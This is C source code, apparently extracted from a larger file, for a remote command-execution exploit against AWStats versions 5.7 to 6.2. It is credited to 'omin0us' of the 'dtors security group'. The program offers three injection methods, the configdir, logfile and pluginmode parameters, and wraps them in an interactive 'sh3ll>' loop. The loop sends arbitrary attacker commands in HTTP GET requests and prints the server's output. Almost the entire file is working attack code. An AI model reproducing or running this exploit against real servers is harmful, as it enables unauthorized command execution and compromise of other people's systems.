#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct in_addr {int dummy; } ;
struct sockaddr_in {struct in_addr sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {char* h_name; scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  FILE ;

/* Variables and functions */
 int /*<<< orphan*/  AF_INET ; 
 int CMD_BUFFER ; 
 int IN_BUFFER ; 
 char* MAGIC_START ; 
 char* MAGIC_STOP ; 
 int /*<<< orphan*/  PORT ; 
 int /*<<< orphan*/  SHUT_WR ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  close (int) ; 
 scalar_t__ connect (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  exit (int) ; 
 int /*<<< orphan*/  fclose (int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/ * fdopen (int,char*) ; 
 int /*<<< orphan*/  fgets (char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  fprintf (int /*<<< orphan*/ *,char*,char*,char*,char*,char*,...) ; 
 int getchar () ; 
 struct hostent* gethostbyname (char*) ; 
 char getopt (int,char**,char*) ; 
 int /*<<< orphan*/  htons (int /*<<< orphan*/ ) ; 
 char* inet_ntoa (struct in_addr) ; 
 int /*<<< orphan*/  memset (char*,int /*<<< orphan*/ ,int) ; 
 char* optarg ; 
 int optind ; 
 int /*<<< orphan*/  printf (char*,...) ; 
 int /*<<< orphan*/  putchar (char) ; 
 int read (int,char*,int) ; 
 int /*<<< orphan*/  setbuf (int /*<<< orphan*/ *,int /*<<< orphan*/ *) ; 
 int /*<<< orphan*/  shutdown (int,int /*<<< orphan*/ ) ; 
 int socket (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stdin ; 
 scalar_t__ strcmp (char*,char*) ; 
 int strlen (char*) ; 
 int /*<<< orphan*/ * strstr (char*,char*) ; 
 int /*<<< orphan*/  usage (char**) ; 

int main(int argc, char *argv[]){

	FILE *output;
	int sockfd;
	struct sockaddr_in addr;
	struct hostent *host;
	char *host_name=NULL, *awstats_dir=NULL;
	char cmd[CMD_BUFFER], cmd_url[CMD_BUFFER*3], incoming[IN_BUFFER], tmp, c, cli_opt;
	int i, j, flag, method, verbose=0;

	
	if(argc < 2){
		usage(argv);
	}
	
	printf("Awstats 5.7 - 6.2 exploit Shell 0.1\n");	
	printf("code by omin0us\n");
	printf("dtors security group\n");
	printf(".: http://dtors.ath.cx :.\n");
    printf("--------------------------------------\n");

	while(1){
		cli_opt = getopt(argc, argv, "h:d:v");

		if(cli_opt < 0)
			break;

		switch(cli_opt){
			case 'v':
				verbose = 1;
				break;
			case 'd':
				awstats_dir = optarg;
				break;
		}
	}

	if((optind >= argc) || (strcmp(argv[optind], "-") == 0)){
		printf("Please specify a Host\n");
		usage(argv);
	}

	if(!awstats_dir){
		awstats_dir = "/cgi-bin/awstats.pl";
	}
	
	printf("select exploit method:\n"
	       "\t1. ?configdir=|cmd}\n"
	       "\t2. ?update=1&logfile=|cmd|\n"
	       "\t3. ?pluginmode=:system(\"cmd\");\n");
	while(method != '1' && method != '2' && method != '3'){
		printf("\nmethod [1/2/3]? ");
		method = getchar();
	}

	printf("starting shell...\n(ctrl+c to exit)\n");
		
	
while(1){
	i=0;
	j=0;
	memset(cmd, 0, CMD_BUFFER);
	memset(cmd_url, 0, CMD_BUFFER*3);
	memset(incoming, 0, IN_BUFFER);
	
	if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
		printf("Error creating socket\n");
		exit(1);
	}

	if((host = gethostbyname(argv[optind])) == NULL){
		printf("Could not resolv host\n");
		exit(1);
	}

	addr.sin_family = AF_INET;
	addr.sin_port = htons(PORT);
	addr.sin_addr = *((struct in_addr *)host->h_addr);

	printf("sh3ll> ");
	fgets(cmd, CMD_BUFFER-1, stdin);
	
	if(verbose)	
		printf("Connecting to %s (%s)...\n", host->h_name, inet_ntoa(*((struct in_addr *)host->h_addr)));

	if( connect(sockfd, (struct sockaddr *)&addr, sizeof(struct sockaddr_in)) != 0){
		printf("Count not connect to host\n");
		exit(1);
	}

	output = fdopen(sockfd, "a");
	setbuf(output, NULL);

	cmd[strlen(cmd)-1] = '\0';
	if(strlen(cmd) == 0){
		cmd[0]='i';
		cmd[1]='d';
		cmd[3]='\0';
	}

	for(i=0; i<strlen(cmd); i++){
		c = cmd[i];
		if(c == ' '){
			cmd_url[j++] = '%';
			cmd_url[j++] = '2';
			cmd_url[j++] = '0';
		}
		else{
			cmd_url[j++] = c;
		}
	}
	cmd_url[j] = '\0';

	if(method == '1'){
		if(verbose){
			printf("Sending Request\n");	
			printf("GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
	
		fprintf(output, "GET %s?configdir=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '2'){
		if(verbose){
			printf("Sending Request\n");
			printf("GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
		}
		fprintf(output, "GET %s?update=1&logfile=|echo;echo+%s;%s;echo+%s;echo| HTTP/1.0\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP);
	}

	if(method == '3'){
		if(verbose){
			printf("Sending Request\n");
			printf("GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
		}
		fprintf(output, "GET %s?pluginmode=:system(\"echo+%s;%s;echo+%s\"); HTTP/1.0\n"
"Connection: Keep-Alive\n"
"Host: %s\n\n", awstats_dir, MAGIC_START, cmd_url, MAGIC_STOP, argv[optind]);
	}


	i=0;
	while(strstr(incoming, MAGIC_START) == NULL){
		flag = read(sockfd, &tmp, 1);
		incoming[i++] = tmp;

		if(i >= IN_BUFFER){
			printf("flag [-] incoming buffer full\n");
			exit(1);
		}
		if(flag==0){
			printf("exploitation of host failed\n");
			exit(1);
		}
	}
	
	while(strstr(incoming, MAGIC_STOP) == NULL){
		read(sockfd,&tmp,1);
		incoming[i++] = tmp;
		putchar(tmp);
		if(i >= IN_BUFFER){
			printf("putchar [-] incoming buffer full\n");
			exit(1);
		}
	}
	printf("\n");
	
	shutdown(sockfd, SHUT_WR);
	close(sockfd);
	fclose(output);
	}
	return(0);
}